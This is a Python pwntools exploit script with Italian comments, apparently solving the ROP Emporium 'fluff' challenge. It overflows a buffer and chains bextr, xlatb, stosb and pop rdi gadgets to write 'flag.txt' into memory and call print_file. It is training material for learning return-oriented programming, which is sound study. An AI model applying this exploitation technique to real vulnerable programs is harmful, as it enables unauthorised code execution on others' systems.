from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")
# context.binary = elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 40
string_to_sand = 'flag.txt'

# context.log_level = 'debug'

def set_env(binary) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop

def search_str(str, al) : # funzione che ricerca una stringa nel binary e ne ritorna il valore in decimale
    
    it = next(elf.search(str.encode("utf-8")))
    return int((hex(it - al)).ljust(12, '0'),0)
    
def control_rbx(to_put) :  # sezione di rop chain che ci permette di controllare rbx 
    
    rop.raw(bextr_gadget) 
    rop.raw(offset_rdx) # 3e10 , 2810 # valore in rdx per decidere l'offset di bit da copiare in rbx 28 = 36° bit, 10 = 17° bit
    rop.raw(to_put)  # add rcx, 0x3ef2
    
def control_al_write() : # pezzo di rop chain che serve per controllare al e scrivere in memoria
    
    rop.raw(xlatb_gadget)  # latxb -> effettua una MOV al, [rax + al]  
    rop.raw(stosb_gadget)  # stosb [rdi], al  ->  prende il valore di al lo interpetra come un carattere e lo salva nell'indirzzo 
                           # puntato da rdi, poi incrementa di uno l'indirzzo puntato da rdi
    
def control_rdi(to_put) : 
    
    rop.raw(pop_rdi_gadget) 
    rop.raw(to_put)

# debug
# gdbscript = "b *main"
# pid = gdb.attach(p, gdbscript=gdbscript)

elf, p, rop = set_env('./fluff') # setting del sistema

# pprint(elf.symbols)
p.recvuntil("...\n")

where_to_write =int(hex(0x00601028),0) # sezione trovata con readelf, .data  -> privilegi WA (write)
stosb_gadget = int(hex(0x00400639),0) # conversione alternativa p64(0x00400639) , usata quella attuale per maggior chiarezza nella chain
bextr_gadget = int(hex(0x0040062a),0) # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx;  questa funzione prende un offset di bit specificato in rdx da rcx e li salva in rbx
xlatb_gadget = int(hex(0x00400628),0) # p64(0x00400628) , MOV al, [rax + al]   è una semplice mov 
pop_rdi_gadget = int(hex(0x004006a3),0) # p64(0x004006a3) , pop rdi, ret;
offset_rdx = int(hex(0x00002810),0) # p64(0x00002810) ,  offset che per prendere i bit dalla 17° posizione alla 40° posizione

# print(hex(elf.symbols["questionableGadgets"]))

# it = next(elf.search(b'f'))   # test cercando i caratteri
# print(it)
# print(hex(it).ljust(12, '0'))

control_rdi(where_to_write)
al = int('b',36) # valore conetuto inizialmente da registro al -> '0x0b' : 11

for s in string_to_sand :

    char_idx = search_str(s, al)
    control_rbx(char_idx)
    control_al_write()
    
    al = ord(s) # nuovo valore in al

control_rdi(where_to_write)
rop.raw(elf.symbols["print_file"])

# rop.call("print_file". where_to_write) # soluzione alternativa alla rop.rdi + rop.raw

payload = [    
    b"A" * offset, 
    rop.chain()
]

payload = b"".join(payload)

p.send(payload)

# print(rop.dump())

p.recvline()

flag = p.recvline()

log.info(f"Questa è la flag : {flag.decode('utf-8')}")
